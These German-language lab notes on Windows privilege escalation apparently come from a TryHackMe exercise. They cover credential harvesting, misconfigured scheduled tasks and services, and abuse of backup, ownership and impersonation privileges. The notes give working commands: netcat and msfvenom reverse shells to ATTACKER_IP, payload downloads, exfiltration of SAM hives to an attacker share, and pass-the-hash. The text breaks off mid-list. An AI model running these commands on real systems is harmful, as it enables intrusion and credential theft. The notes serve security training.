# Generelle Infos
Vereinfacht gesagt, besteht die Privilegieneskalation darin, dass "Benutzer A" Zugang zu einem Host erhält und diesen nutzt, um durch Ausnutzung einer Schwachstelle im Zielsystem Zugang zu "Benutzer B" zu erhalten. Obwohl wir normalerweise wollen, dass "Benutzer B" über administrative Rechte verfügt, kann es Situationen geben, in denen wir uns in andere nicht privilegierte Konten einklinken müssen, bevor wir tatsächlich administrative Rechte erhalten.
Der Zugriff auf verschiedene Konten kann so einfach sein wie das Auffinden von Anmeldeinformationen in Textdateien oder in Tabellen, die von einem unvorsichtigen Benutzer ungesichert gelassen wurden, aber das ist nicht immer der Fall. Je nach Situation müssen wir möglicherweise einige der folgenden Schwachstellen ausnutzen:

- Fehlkonfigurationen bei Windows-Diensten oder geplanten Aufgaben
- Übermäßige Rechte, die unserem Konto zugewiesen wurden
- Anfällige Software
- Fehlende Windows-Sicherheitspatches
- Bevor wir uns mit den eigentlichen Techniken befassen, sollten wir uns die verschiedenen Kontotypen auf einem Windows-System ansehen.

#### User Arten in Windows 
Windows hat Primär zwei arten an Nutzern, welche sich anhand ihrer Berechtigungen in 2 Gruppen aufteilen lässt.

| UserGruppe      | Zugriff                                                                                                                                                                                                                               |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Administratoren | Diese Nutzer haben die meisten Rechte, sie können System Configs ändern und auf jede Datei im System zugreifen                                                                                                                        |
| Standard User   | Diese Benutzer können auf den Computer zugreifen, aber nur begrenzte Aufgaben ausführen. Normalerweise können diese Benutzer keine dauerhaften oder wesentlichen Änderungen am System vornehmen und sind auf ihre Dateien beschränkt. |

Jeder Benutzer mit administrativen Rechten ist Teil der Gruppe Administratoren. Standardbenutzer hingegen sind Teil der Gruppe Benutzer.
Darüber hinaus hört man in der Regel von einigen speziellen eingebauten Konten, die vom Betriebssystem im Zusammenhang mit der Eskalation von Rechten verwendet werden:

| Built in Account     | Zugriff                                                                                                                                                                                                         |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SYSTEM / LocalSystem | Ein Konto, das vom Betriebssystem zur Ausführung interner Aufgaben verwendet wird. Es hat vollen Zugriff auf alle auf dem Host verfügbaren Dateien und Ressourcen mit noch höheren Rechten als Administratoren. |
| Lokaler Dienst       | Standardkonto, das zur Ausführung von Windows-Diensten mit "minimalen" Rechten verwendet wird. Es wird anonyme Verbindungen über das Netzwerk verwenden.                                                        |
| Netzwerkdienst       | Standardkonto, das zur Ausführung von Windows-Diensten mit "minimalen" Rechten verwendet wird. Es verwendet die Anmeldeinformationen des Computers, um sich über das Netzwerk zu authentifizieren.              |

# Sammeln von Passwörtern aus Bekannten Orten

Der einfachste Weg, sich Zugang zu einem anderen Benutzer zu verschaffen, ist das Sammeln von Anmeldedaten von einem kompromittierten Rechner. Solche Zugangsdaten können aus vielen Gründen existieren, z. B. wenn ein unvorsichtiger Benutzer sie in Klartextdateien hinterlässt oder wenn sie von Software wie Browsern oder E-Mail-Clients gespeichert werden.

### Unbeaufsichtigte Windows-Installationen
 Bei der Installation von Windows auf einer großen Anzahl von Hosts können Administratoren Windows Deployment Services verwenden, mit denen ein einziges Betriebssystem-Image über das Netzwerk auf mehreren Hosts bereitgestellt werden kann. Diese Art von Installationen werden als unbeaufsichtigte Installationen bezeichnet, da sie keine Benutzerinteraktion erfordern. Solche Installationen erfordern die Verwendung eines Administratorkontos, um die anfängliche Einrichtung durchzuführen, die auf dem Rechner an folgenden Stellen gespeichert werden kann:
 - C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

Innerhalb dieser Datein können Passwörter in dem Folgenden Format hinterlegt sein 
```
shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell Verlauf  

Jedes Mal, wenn ein Benutzer einen Befehl mit Powershell ausführt, wird dieser in einer Datei gespeichert, die eine Erinnerung an frühere Befehle enthält. Dies ist nützlich, um Befehle, die zuvor verwendet wurden, schnell zu wiederholen. Wenn ein Benutzer einen Befehl ausführt, der ein Kennwort direkt als Teil der Powershell-Befehlszeile enthält, kann es später mit dem folgenden Befehl von einer cmd-Eingabeaufforderung abgerufen werden:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Gespeicherte Windows Credentials
  
Windows ermöglicht es uns, die Anmeldedaten anderer Benutzer zu verwenden. Diese Funktion bietet auch die Möglichkeit, diese Anmeldeinformationen im System zu speichern. Der folgende Befehl listet die gespeicherten Anmeldeinformationen auf:
```
cmdkey /list
```
  
Zwar kann man die tatsächlichen Passwörter nicht sehen, aber wenn man einige Zugangsdaten sieht, die es wert sind, ausprobiert zu werden, kann man sie mit dem Befehl `runas` und der Option `/savecred` verwenden, wie unten zu sehen.
```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration
  
Internet Information Services (IIS) ist der Standard-Webserver auf Windows-Installationen. Die Konfiguration von Websites auf IIS wird in einer Datei namens `web.config` gespeichert und kann Passwörter für Datenbanken oder konfigurierte Authentifizierungsmechanismen speichern. Je nach der installierten Version von IIS kann web.config an einem der folgenden Orte zu finden sein:
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Hier ist eine schnelle Methode, um Datenbankverbindungszeichenfolgen in der Datei zu finden:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Passwörter aus Applikationen holen: PuTTY

PuTTY ist ein SSH-Client, der häufig auf Windows-Systemen zu finden ist. Anstatt die Parameter einer Verbindung jedes Mal neu festlegen zu müssen, können Benutzer Sitzungen speichern, in denen die IP, der Benutzer und andere Konfigurationen zur späteren Verwendung gespeichert werden. PuTTY erlaubt es Benutzern zwar nicht, ihr SSH-Passwort zu speichern, aber es speichert Proxy-Konfigurationen, die Authentifizierungsdaten im Klartext enthalten.

Um die gespeicherten Proxy-Zugangsdaten abzurufen, kann man mit dem folgenden Befehl unter dem folgenden Registrierungsschlüssel nach ProxyPassword suchen:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


## Andere Schnelle Siege

### Scheduled Tasks
Wenn man sich die geplanten Aufgaben auf dem Zielsystem ansieht, sieht man vielleicht eine geplante Aufgabe, die entweder ihre Binärdatei verloren hat oder eine Binärdatei verwendet, die man ändern kann. Geplante Aufgaben können über die Befehlszeile mit dem Befehl `schtasks` ohne Optionen aufgelistet werden. Um detaillierte Informationen über einen der Dienste abzurufen, kann man einen Befehl wie den folgenden verwenden:

```
schtasks /query /tn vulntask /fo list /v
```

Man erhält viele Informationen über die Task, aber was für uns wichtig ist, ist der Parameter „Task to Run“, der angibt, was von der geplanten Task ausgeführt werden soll, und der Parameter „Run As User“, der den Benutzer angibt, der für die Ausführung der Task verwendet werden soll.

  Wenn unser aktueller Benutzer die ausführbare Datei „Task to Run“ ändern oder überschreiben kann, können wir kontrollieren, was von dem Benutzer *Beispielnutzer* ausgeführt wird, was zu einer einfachen Privilegienerweiterung führt. Um die Dateiberechtigungen für die ausführbare Datei zu überprüfen, verwenden wir icacls:
```
  icacls c:\tasks\schtask.bat
```
Wie im Ergebnis zu sehen ist, hat die Gruppe BUILTIN\Users vollen Zugriff (F) auf die Binärdatei der Aufgabe. Das bedeutet, dass wir die .bat-Datei ändern und jede beliebige Payload einfügen können.  Praktischer Weise kann auf dem Besipiel gerät unter C:\tools Net Cat gefunden werden und wir können so eine Reverse Shell in die Task einbauen via:
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
Die Reverse Shell die dadurch gespawnt wird hat dann entsprefchende admin rechte.

###  AlwaysInstallElevated

Windows-Installationsdateien (auch als .msi-Dateien bekannt) werden verwendet, um Anwendungen auf dem System zu installieren. Sie werden normalerweise mit der Berechtigungsstufe des Benutzers ausgeführt, der sie startet. Sie können jedoch so konfiguriert werden, dass sie von jedem Benutzerkonto (auch von einem nicht privilegierten) mit höheren Rechten ausgeführt werden. Auf diese Weise könnte es möglich sein, eine bösartige MSI-Datei zu erzeugen, die mit Administrator-Rechten ausgeführt wird.

Für diese Methode müssen zwei Registry-Werte gesetzt werden. Sie können diese über die Befehlszeile mit den folgenden Befehlen abfragen.
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
  
Um diese Schwachstelle ausnutzen zu können, muss beides gesetzt sein. Andernfalls ist ein Ausnutzen nicht möglich. Wenn sie gesetzt sind, kann man eine bösartige .msi-Datei mit msfvenom erzeugen, mit dem Befehl unterhalb:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Da hier eine Reverseshell aus Metasploit/msfvenom genutzt wird sollte man passender weise auch den Multihandler zum Fangen der Shell nutzen. 
Da es sich um eine Reverse Shell handelt, sollten Sie auch das entsprechend konfigurierte Metasploit Handler-Modul ausführen. Sobald die erstellte Datei übertragen wurde, kann der Installer mit dem unten stehenden Befehl ausgeführt werden, um die Reverse-Shell zu erhalten:
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

# Ausnutzen von Fehl Konfigurierten Services

### Windows Services
  
Windows-Dienste werden durch den Service Control Manager (SCM) verwaltet. Der SCM ist ein Prozess, der den Status von Diensten nach Bedarf verwaltet, den aktuellen Status eines bestimmten Dienstes überprüft und allgemein eine Möglichkeit zur Konfiguration von Diensten bietet.
Jeder Dienst auf einem Windows-Rechner hat eine zugehörige ausführbare Datei, die vom SCM ausgeführt wird, sobald ein Dienst gestartet wird. Es ist wichtig zu beachten, dass ausführbare Dateien von Diensten spezielle Funktionen implementieren, um mit dem SCM kommunizieren zu können. Daher kann nicht jede ausführbare Datei erfolgreich als Dienst gestartet werden. Jeder Dienst gibt auch das Benutzerkonto an, unter dem der Dienst ausgeführt wird.

Um die Struktur eines Dienstes besser zu verstehen, überprüfen wir die Konfiguration des Dienstes apphostsvc mit dem Befehl
```
sc qc *Servicename*
bzw in dem Besipiel dann 
sc qc apphostsvc
```

https://i.imgur.com/hBI3eMq.png

Hier können wir in dem Beeipiel sehen, dass die zugehörige ausführbare Datei über den Parameter BINARY_PATH_NAME angegeben wird, und das Konto, das zur Ausführung des Dienstes verwendet wird, ist im Parameter SERVICE_START_NAME angegeben.

Dienste verfügen über eine Discretionary Access Control List (DACL), die unter anderem angibt, wer die Berechtigung hat, den Dienst zu starten, zu stoppen, anzuhalten, den Status abzufragen, die Konfiguration abzufragen oder den Dienst neu zu konfigurieren. Die DACL kann über Process Hacker (auf dem Desktop Ihres Rechners verfügbar) eingesehen werden:

https://imgur.com/zuQqnIE

Alle Konfigurationen der Dienste werden in der Registry unter `HKLM\SYSTEM\CurrentControlSet\Services\` gespeichert:
https://imgur.com/TqaLRxx

Für jeden Dienst im System gibt es einen Unterschlüssel. Auch hier können wir die zugehörige ausführbare Datei im ImagePath Wert und das zum Starten des Dienstes verwendete Konto im Wert ObjectName sehen. Wenn für den Dienst eine DACL konfiguriert wurde, wird sie in einem Unterschlüssel namens Security gespeichert. Wie inzwischen bekannt ist, können solche Registry-Einträge standardmäßig nur von Administratoren geändert werden.

###  Insecure Permissions on Service Executable
Wenn die ausführbare Datei, die mit einem Dienst verbunden ist, schwache Berechtigungen hat, die es einem Angreifer erlauben, sie zu ändern oder zu ersetzen, kann der Angreifer die Privilegien des Kontos des Dienstes auf einfache Weise erlangen.

Um zu verstehen, wie das funktioniert, schauen wir uns eine Sicherheitslücke an, die im Splinterware System Scheduler gefunden wurde. Zunächst werden wir die Konfiguration des Dienstes mit sc abfragen:

https://imgur.com/dPeEhvL

Wir sehen, dass der von der anfälligen Software installierte Dienst unter dem Namen svcuser1 ausgeführt wird und dass sich die ausführbare Datei, die mit dem Dienst verbunden ist, in `C:\Progra~2\System~1\WService.exe` befindet. Anschließend überprüfen wir die Berechtigungen für die ausführbare Datei:

  https://imgur.com/yt80nnq

Und hier haben wir etwas Interessantes. Die Gruppe Jeder hat Änderungsrechte (M) für die ausführbare Datei des Dienstes. Das bedeutet, dass wir sie einfach mit einem beliebigen Payload unserer Wahl überschreiben können, und der Dienst wird sie mit den Rechten des konfigurierten Benutzerkontos ausführen.
Erzeugen wir einen Payload für einen Exe-Dienst mit msfvenom und stellen ihn über einen Python-Webserver bereit:

Befehl für msfvenom 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
Befehl für den Python web server zum Bereitstellen:
```
python3 -m http.server
```

Die Payload kann dann via Powershell mit dem Folgenden Befehl geladen werden: 

```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Sobald sich die Payload auf dem Windows-Server befindet, ersetzen wir die ausführbare Datei des Dienstes durch unsere Payload. Da wir einen anderen Benutzer benötigen, um unseren Payload auszuführen, müssen wir der Gruppe „Jeder“ ebenfalls volle Berechtigungen gewähren:
Das machen wir mit den Befehlen: 
```
cd C:\PROGRA~2\SYSTEM~1\    #um in das Verzeichniss zu navigieren
move WService.exe WService.exe.bkp   #Um die Orginale Datei umzubenennen zu WSERVICE.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe    #Verschieben un Umbenennen der Payload
icacls WService.exe /grant Everyone:F       #Allen Nutzern volle rechte geben
```
http://imgur.com/QvxL7UX

Jetzt starten wir unseren Listener für die Reverse shell via `nc -lvp 4445` und im Anschluss kann der Dienst neugestartet werden via 
```
sc stop windowscheduler
sc start windowscheduler
```

### Unquoted Service Paths

Wenn wir nicht wie bisher direkt in die ausführbaren Dateien eines Dienstes schreiben können, gibt es immer noch die Möglichkeit, einen Dienst dazu zu zwingen, beliebige ausführbare Dateien auszuführen, indem man eine ziemlich obskure Funktion nutzt.
Bei der Arbeit mit Windows-Diensten tritt ein ganz besonderes Verhalten auf, wenn der Dienst so konfiguriert ist, dass er auf eine „unquotierte“ ausführbare Datei verweist. Mit „unquotiert“ ist gemeint, dass der Pfad der zugehörigen ausführbaren Datei nicht richtig in Anführungszeichen gesetzt ist, um Leerzeichen im Befehl zu berücksichtigen.
Schauen wir uns als Beispiel den Unterschied zwischen zwei Diensten an (diese Dienste dienen nur als Beispiel und sind auf Ihrem Rechner möglicherweise nicht verfügbar). Der erste Dienst verwendet ein korrektes Anführungszeichen, so dass der SCM zweifelsfrei weiß, dass er die Binärdatei mit dem Namen „C:\Programme\RealVNC\VNC Server\vncserver.exe“, gefolgt von den angegebenen Parametern, ausführen muss:

https://i.imgur.com/LF2B6Yr.png

Der zweite in dem Besipiel oberhalb erfüllt keine richtige "quotation".

Wenn der SCM versucht, die zugehörige Binärdatei auszuführen, tritt ein Problem auf. Da der Name des Ordners "Disk Sorter Enterprise" Leerzeichen enthält, wird der Befehl mehrdeutig, und der SCM weiß nicht, welche der folgenden Befehle Sie auszuführen versuchen:

|Command|Argument 1|Argument 2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||
Dies hat damit zu tun, wie die Eingabeaufforderung einen Befehl analysiert. Wenn Sie einen Befehl senden, werden normalerweise Leerzeichen als Argumenttrennzeichen verwendet, es sei denn, sie sind Teil einer in Anführungszeichen gesetzten Zeichenfolge. Das bedeutet, dass die „richtige“ Interpretation des nicht in Anführungszeichen gesetzten Befehls darin bestünde, C:\\MeineProgramme\\Disk.exe auszuführen und den Rest als Argumente zu übernehmen.

Anstatt zu scheitern, wie es wahrscheinlich der Fall sein sollte, versucht der SCM, dem Benutzer zu helfen und beginnt mit der Suche nach den einzelnen Binärdateien in der in der Tabelle angegebenen Reihenfolge:
1. Zuerst wird nach C:\\MyPrograms\\Disk.exe gesucht. Wenn sie existiert, führt der Dienst diese ausführbare Datei aus.
2. Wenn letztere nicht vorhanden ist, sucht er anschließend nach C:\\MyPrograms\\Disk Sorter.exe. Wenn diese vorhanden ist, führt der Dienst diese ausführbare Datei aus.
3. Wenn letztere nicht existiert, sucht er nach C:\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. Es wird erwartet, dass diese Option erfolgreich ist, und sie wird normalerweise bei einer Standardinstallation ausgeführt.

Anhand dieses Verhaltens wird das Problem deutlich. Wenn ein Angreifer eine der ausführbaren Dateien erstellt, nach denen vor der erwarteten ausführbaren Datei des Dienstes gesucht wird, kann er den Dienst zwingen, eine beliebige ausführbare Datei auszuführen.
Das hört sich zwar trivial an, aber die meisten ausführbaren Dateien der Dienste werden standardmäßig unter C:\Programme oder C:\Programme (x86) installiert, die für unberechtigte Benutzer nicht beschreibbar sind. Dadurch wird verhindert, dass ein anfälliger Dienst ausgenutzt werden kann. Es gibt Ausnahmen von dieser Regel: - Einige Installationsprogramme ändern die Berechtigungen für die installierten Ordner, wodurch die Dienste angreifbar werden. - Ein Administrator könnte beschließen, die Dienst-Binärdateien in einem nicht standardmäßigen Pfad zu installieren. Wenn ein solcher Pfad weltweit beschreibbar ist, kann die Sicherheitslücke ausgenutzt werden.

In unserem Fall Beispiel installierte der Administrator die Disk Sorter-Binärdateien unter c:\MyPrograms. Standardmäßig erbt dieses Verzeichnis die Berechtigungen des Verzeichnisses C:\, so dass jeder Benutzer darin Dateien und Ordner erstellen kann. Wir können dies mit icacls überprüfen:
```
icals c:\MyPrograms
```
https://i.imgur.com/EcvTtsf.png

Die Gruppe BUILTIN\\Users hat AD- und WD-Rechte, so dass der Benutzer Unterverzeichnisse bzw. Dateien erstellen kann.
Der Prozess der Erstellung eines Exe-Dienst-Payloads mit msfvenom und dessen Übertragung auf den Zielhost ist derselbe wie zuvor, daher können wir folgende Payload erstellen und sie wie zuvor auf den Server hochladen. Wir werden auch einen Listener starten, um die Reverse Shell zu empfangen, wenn sie ausgeführt wird:

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe 
# Erstellen der Payload

#Starten des Listeners
user@attackerpc$ nc -lvp 4446
```
  
Sobald sich die Payload auf dem Server befindet, verschiebt man sie an einen der Orte, an denen ein Hijacking stattfinden könnte. In diesem Fall verschieben wir unseren Payload nach C:\MyPrograms\Disk.exe. Wir gewähren außerdem allen Benutzern volle Rechte für die Datei, um sicherzustellen, dass sie vom Dienst ausgeführt werden kann:
```
#Verschieben und Umbenennen
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

# allen rechte auf die Datei geben
icacls C:\MyPrograms\Disk.exe /grant Everyone:F

#Stoppen und Starten des Dienstes am besten via CMD
sc stop "disk sorter enterprise" 
sc start "disk sorter enterprise"
```


### Insecure Service Permissions
Unter Umständen haben Sie noch eine kleine Chance, einen Dienst zu nutzen, wenn die ausführbare DACL (Discretionary Access Control Lists) des Dienstes gut konfiguriert ist und der Binärpfad des Dienstes richtig angegeben ist. Sollte die DACL des Dienstes (nicht die ausführbare DACL des Dienstes) es Ihnen erlauben, die Konfiguration eines Dienstes zu ändern, können Sie den Dienst neu konfigurieren. Dadurch können Sie auf jede beliebige ausführbare Datei verweisen und sie mit jedem beliebigen Konto ausführen, einschließlich SYSTEM selbst.

Um von der Befehlszeile aus nach einer Dienst-DACL zu suchen, können Sie Accesschk aus der Sysinternals-Suite verwenden. Eine Kopie davon finden Sie unter C:\\tools. Der Befehl zur Überprüfung der DACL für den Dienst thmservice lautet:
```
accesschk64.exe -qlc thmservice
```
Hier können wir sehen, dass die Gruppe BUILTIN\\Users die Berechtigung SERVICE_ALL_ACCESS hat, was bedeutet, dass jeder Benutzer den Dienst neu konfigurieren kann.
https://imgur.com/KBCAl9k
  

Bevor wir den Dienst ändern, erstellen wir eine weitere exe-service reverse shell und starten einen Listener dafür auf dem Rechner des Angreifers:
```
Payload Anlegen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe


Listener Starten
nc -lvp 4447
```

Wie Gewohnt übertragen wir diese via wget in dem besipeil machen wir das in dem `C:\Users\thm-unpriv` Verzeichniss mit:
```
 wget http://10.10.46.52:8000/rev-svc3.exe -O rev-svc3.exe
```

Da Der file Name und ort nicht mehr angepasst werden müssen können wir direkt die Rechte anpassen 
```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```
  
Um die dem Dienst zugeordnete ausführbare Datei und das Konto zu ändern, können wir den folgenden Befehl verwenden (beachten Sie die Leerzeichen nach den Gleichheitszeichen, wenn Sie sc.exe verwenden):
```
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Und im anschluss wird der Dienst nochmal gestoppt und wieder neu gestartet
```
sc stop THMService 
sc start THMService
```


# Ausnutzen von Gefährlichen Privilegien
### Windows Privileges

Privilegien sind Rechte, mit denen ein Konto bestimmte systembezogene Aufgaben ausführen kann. Diese Aufgaben können so einfach sein wie das Recht, den Rechner herunterzufahren, bis hin zu Rechten zur Umgehung einiger DACL-basierter Zugriffskontrollen.
Jeder Benutzer hat eine Reihe von zugewiesenen Privilegien, die mit dem folgenden Befehl überprüft werden können:
```
whoami /priv
```

Eine vollständige Liste der verfügbaren Berechtigungen auf Windows-Systemen ist hier zu finden (https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Vom Standpunkt eines Angreifers aus sind nur die Privilegien von Interesse, die eine Eskalation im System ermöglichen. Eine umfassende Liste der ausnutzbaren Privilegien kann auf dem Github-Projekt Priv2Admin gefunden werden. https://github.com/gtworek/Priv2Admin

### SeBackup / SeRestore
Die Privilegien SeBackup und SeRestore erlauben es den Benutzern, jede Datei im System zu lesen und zu schreiben, ohne Rücksicht auf bestehende DACL. Die Idee hinter diesem Privileg ist es, bestimmten Benutzern die Möglichkeit zu geben, Backups von einem System durchzuführen, ohne volle administrative Rechte zu benötigen.

Mit dieser Befugnis kann ein Angreifer auf triviale Weise seine Privilegien auf dem System ausweiten, indem er viele Techniken einsetzt. Die Methode in dem Beispiel untersuchte besteht darin, die SAM- und SYSTEM-Registry-Hives zu kopieren, um den Hash des lokalen Administrator-Passworts zu extrahieren.

Da der Hierfür benutzte user Bereits ein Admin ist können wir hergehen und eine Admin CMD öffnen damit wir dann im nächsten schritt schauen können wie genau die Berechtigungen der Nutzer sind. Das Geht dann via: 

```
whoami/priv
```

Dass sollte ungefähr dann so aussehen:
https://imgur.com/Cu0vLs8

Um die SAM- und SYSTEM-Hashes zu sichern, können wir die folgenden Befehle verwenden:

```
reg save hklm\system C:\Users\THMBackup\system.hive

reg save hklm\sam C:\Users\THMBackup\sam.hive
```

  
Dadurch werden einige Dateien mit dem Inhalt der Registrierungsdateien erstellt. Wir können diese Dateien nun mit SMB oder einer anderen verfügbaren Methode auf unseren Angreifer-Rechner kopieren. Für SMB können wir die Datei smbserver.py von impacket verwenden, um einen einfachen SMB-Server mit einer Netzwerkfreigabe im aktuellen Verzeichnis unserer AttackBox zu starten:

```
mkdir share 
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
  
Dadurch wird eine Freigabe mit dem Namen public erstellt, die auf das Freigabeverzeichnis verweist und den Benutzernamen und das Passwort unserer aktuellen Windows-Sitzung erfordert. Danach können wir den Kopierbefehl in unserem Windows-Rechner verwenden, um beide Dateien auf unsere AttackBox zu übertragen:
```
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\ 
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Und verwenden dann impacket, um die Passwort-Hashes der Benutzer abzurufen:

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```  

Schließlich können wir den Hash des Administrators verwenden, um einen Pass-the-Hash-Angriff durchzuführen und Zugang zum Zielcomputer mit SYSTEM-Rechten zu erhalten:

```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.198.160
```


### SeTakeOwnership
Das SeTakeOwnership-Privileg erlaubt es einem Benutzer, das Eigentum an jedem Objekt auf dem System zu übernehmen, einschließlich Dateien und Registry-Schlüsseln, was einem Angreifer viele Möglichkeiten eröffnet, seine Privilegien zu erhöhen, da wir zum Beispiel nach einem Dienst suchen könnten, der als SYSTEM läuft, und das Eigentum an der ausführbaren Datei des Dienstes übernehmen könnten. 

Das Beispiel wird aber auf anderem Wege die Privilegien erweitern

Wie Zuvor auch brauchen wir am Anfang eine Admin CMD in der wir schauen welche Rechte wir haben, das geht wieder via 

```
whoami /priv
```
und Das Resultat sollte ungefähr so aussehen: 

https://imgur.com/0BBlKps


Diesmal missbrauchen wir utilman.exe, um die Berechtigungen zu erweitern. Utilman ist eine integrierte Windows-Anwendung, die dazu dient, während des Sperrbildschirms Optionen zur Erleichterung des Zugangs bereitzustellen. Da Utilman mit SYSTEM-Privilegien ausgeführt wird, erhalten wir effektiv SYSTEM-Privilegien, wenn wir die ursprüngliche Binärdatei durch eine beliebige Payload ersetzen. Da wir das Eigentum an jeder Datei übernehmen können, ist das Ersetzen trivial.

Um utilman zu ersetzen, übernehmen wir zunächst mit dem folgenden Befehl die Rechte an der Datei:

```
takeown /f C:\Windows\System32\Utilman.exe
```

Zu Beachten ist hier dass das Besitzen einer Datei nicht unbedingt Bedeutet dass man auch die Rechte über diese hat, <aber als Besitzer kann man sich selbst alle Rechte geben, die man braucht. Um Ihrem Benutzer volle Rechte auf utilman.exe zu geben, können Sie den folgenden Befehl verwenden:

```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Danach ersetzen wir noch die utilman.exe mit einer Copie der CMD Damit wir beim starten der Modifizierten Utilman exe eine Shell bekommen mit System Rechten. 

Danach kann das Gerät gesperrt werden und über Utilman wie oben geschildert eine Shell Gespawnt werden mit System Rechten.

### SeImpersonate / SeAssignPrimaryToken

Basic Erklärung der Idee dahinter:

Diese Privilegien ermöglichen es einem Prozess, sich als ein anderer Benutzer auszugeben und in dessen Namen zu handeln. Impersonation besteht in der Regel darin, dass ein Prozess oder Thread unter dem Sicherheitskontext eines anderen Benutzers gestartet werden kann.
Impersonation ist leicht zu verstehen, wenn man sich vor Augen führt, wie ein FTP-Server funktioniert. Der FTP-Server muss den Zugriff der Benutzer auf die Dateien beschränken, die sie sehen dürfen.
Nehmen wir an, wir haben einen FTP-Dienst, der mit dem Benutzer ftp läuft. Ohne Impersonation würde der FTP-Dienst, wenn sich die Benutzerin Ann beim FTP-Server anmeldet und versucht, auf ihre Dateien zuzugreifen, versuchen, mit seinem Zugriffstoken und nicht mit dem von Ann zuzugreifen:
https://imgur.com/4xyUjqI
  

Es gibt mehrere Gründe, warum die Verwendung des FTP-Tokens nicht die beste Idee ist: - Damit die Dateien korrekt zugestellt werden können, müssen sie für den FTP-Benutzer zugänglich sein. Im obigen Beispiel könnte der FTP-Dienst auf die Dateien von Ann zugreifen, aber nicht auf die von Bill, da die DACL in Bills Dateien dem Benutzer ftp nicht erlaubt. Dies macht die Sache noch komplizierter, da wir für jede bereitgestellte Datei/jedes bereitgestellte Verzeichnis manuell spezifische Berechtigungen konfigurieren müssen. - Für das Betriebssystem erfolgt der Zugriff auf alle Dateien per Benutzer-ftp, unabhängig davon, welcher Benutzer gerade beim FTP-Dienst angemeldet ist. Dies macht es unmöglich, die Berechtigung an das Betriebssystem zu delegieren; daher muss der FTP-Dienst sie implementieren. - Wenn der FTP-Dienst irgendwann kompromittiert würde, hätte der Angreifer sofort Zugriff auf alle Ordner, auf die der FTP-Benutzer Zugriff hat.
Verfügt der Benutzer des FTP-Dienstes hingegen über das Privileg SeImpersonate oder SeAssignPrimaryToken, wird all dies etwas vereinfacht, da der FTP-Dienst vorübergehend das Zugriffstoken des sich anmeldenden Benutzers an sich nehmen und damit beliebige Aufgaben in dessen Namen ausführen kann:
https://imgur.com/YEkVOkV

Wenn sich nun die Benutzerin Ann beim FTP-Dienst anmeldet und der ftp-Benutzer über Impersonation-Rechte verfügt, kann er sich Anns Zugriffstoken ausleihen und damit auf ihre Dateien zugreifen. Auf diese Weise müssen die Dateien dem Benutzer ftp keinerlei Zugriff gewähren, und das Betriebssystem übernimmt die Autorisierung. Da der FTP-Dienst sich als Ann ausgibt, kann er während dieser Sitzung nicht auf die Dateien von Jude oder Bill zugreifen.

  

Wenn es uns als Angreifer gelingt, die Kontrolle über einen Prozess mit SeImpersonate- oder SeAssignPrimaryToken-Rechten zu übernehmen, können wir uns als jeder Benutzer ausgeben, der sich mit diesem Prozess verbindet und authentifiziert.
In Windows-Systemen verfügen die Konten LOCAL SERVICE und NETWORK SERVICE bereits über solche Berechtigungen. Da diese Konten verwendet werden, um Dienste mit eingeschränkten Konten zu starten, ist es sinnvoll, ihnen zu erlauben, sich als Benutzer auszugeben, wenn der Dienst dies benötigt. Internet Information Services (IIS) erstellt auch ein ähnliches Standardkonto namens „iis apppool\defaultapppool“ für Webanwendungen.

Um die Berechtigungen mit Hilfe solcher Konten zu erhöhen, benötigt ein Angreifer Folgendes: 
1. Er muss einen Prozess erstellen, damit Benutzer eine Verbindung herstellen und sich bei diesem authentifizieren können, um sich als Person ausgeben zu können. 
